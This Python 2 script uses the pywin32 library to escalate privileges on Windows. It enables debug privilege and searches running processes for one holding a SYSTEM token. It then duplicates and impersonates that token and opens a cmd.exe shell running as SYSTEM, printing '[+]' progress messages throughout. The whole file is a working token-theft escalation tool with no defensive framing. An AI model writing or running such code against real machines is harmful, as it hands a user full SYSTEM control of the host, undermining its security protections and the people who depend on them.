import win32api, win32pdh, win32process, win32security, win32con, win32profile
import pywintypes

def EnablePrivilege(privilegeStr, token = None):
    """Enable Privilege on token, if no token is given the function gets the token of the current process."""
    if token == None:
        token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)

    privilege_id = win32security.LookupPrivilegeValue(None, privilegeStr)
    old_privs = win32security.AdjustTokenPrivileges(token, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])


def procids():
    """Returns a list with all running processes and their pids."""
    junk, instances = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
    proc_ids=[]
    proc_dict={}

    for instance in instances:
        if instance in proc_dict:
            proc_dict[instance] += 1
        else:
            proc_dict[instance] = 0

    for instance, max_instances in proc_dict.items():
        for inum in xrange(max_instances+1):
            hq = win32pdh.OpenQuery()
            path = win32pdh.MakeCounterPath( (None,'process',instance, None, inum,'ID Process') )
            counter_handle=win32pdh.AddCounter(hq, path) 
            win32pdh.CollectQueryData(hq)
            type, val = win32pdh.GetFormattedCounterValue(counter_handle, win32pdh.PDH_FMT_LONG)
            proc_ids.append((instance,str(val)))
            win32pdh.CloseQuery(hq) 
 
    return [int(pid[1]) for pid in proc_ids]

def GetLocalSystemProcessToken():
    """Takes a list of pids and checks if the process has a token with SYSTEM user, if so it returns the token handle."""
    systemsid = win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, "nt authority\\system")[0])
    
    tokenprivs = (win32con.TOKEN_QUERY | win32con.TOKEN_READ | win32con.TOKEN_IMPERSONATE | win32con.TOKEN_QUERY_SOURCE | win32con.TOKEN_DUPLICATE | win32con.TOKEN_ASSIGN_PRIMARY | win32con.TOKEN_EXECUTE)

    for pid in procids():
        try:
            PyhProcess = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)
            PyhToken = win32security.OpenProcessToken(PyhProcess, tokenprivs)
##Get the token SID.
            sid = win32security.ConvertSidToStringSid(win32security.GetTokenInformation(PyhToken, win32security.TokenUser)[0])

##If token SID is the SID of SYSTEM, return the token handle.
            if sid == systemsid:
                win32api.CloseHandle(PyhProcess)
                return PyhToken
            win32api.CloseHandle(PyhToken)
            win32api.CloseHandle(PyhProcess)

        except pywintypes.error,e :
            print "[!] Error:" + str(e[2])


##Enable SE_DEBUG_NAME(debugprivileges) on the current process.
print "[+] Enabling SE_DEBUG_NAME"
EnablePrivilege(win32security.SE_DEBUG_NAME)

##Get a SYSTEM user token.
print "[+] Retrieving SYSTEM token"
PyhToken = GetLocalSystemProcessToken()

##Duplicate it to a Primary Token, so it can be passed to CreateProcess.
print "[+] Duplicating token"
PyhTokendupe = win32security.DuplicateTokenEx(
                                            PyhToken,
                                            win32security.SecurityImpersonation,
                                            win32con.MAXIMUM_ALLOWED,
                                            win32security.TokenPrimary,
                                            TokenAttributes = None)
##Now we have duplicated the token, we can close the orginal.
win32api.CloseHandle(PyhToken)

##Enable SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME, these are both needed to start a process with a token.
print "[+] Enabling SE_ASSIGNPRIMARYTOKEN_NAME"
EnablePrivilege(win32security.SE_ASSIGNPRIMARYTOKEN_NAME, token = PyhTokendupe)

print "[+] Enabling SE_INCREASE_QUOTA_NAME"
EnablePrivilege(win32security.SE_INCREASE_QUOTA_NAME, token = PyhTokendupe)

##Enable SE_IMPERSONATE_NAME, so that we can impersonate the SYSTEM token.
print "[+] Enabling SE_IMPERSONATE_NAME"
EnablePrivilege(win32security.SE_IMPERSONATE_NAME)

print "[+] Impersonating token"
win32security.ImpersonateLoggedOnUser(PyhTokendupe)
print "[+] Running as: " + win32api.GetUserName()

##Start the process with the token.
try:
    print "[+] Starting shell as SYSTEM"
    pi =  win32process.CreateProcessAsUser(
                                            PyhTokendupe,
                                            r"C:\Windows\System32\cmd.exe",
                                            None,
                                            None,
                                            None,
                                            True,
                                            win32process.CREATE_NEW_CONSOLE,
                                            None,
                                            None,
                                            win32process.STARTUPINFO())
    print "\t[+]PID: " + str(pi[2])
except pywintypes.error,e :
    print "[!] Error:" + str(e[2])

##Clean up, revert back to self and close the 
print "[+] Cleaning up: "

print "\t[+] Reverting to self"
win32security.RevertToSelf()
print "\t[+] Running as: " + win32api.GetUserName()

print "\t[+] Closing Handle"
win32api.CloseHandle(PyhTokendupe)
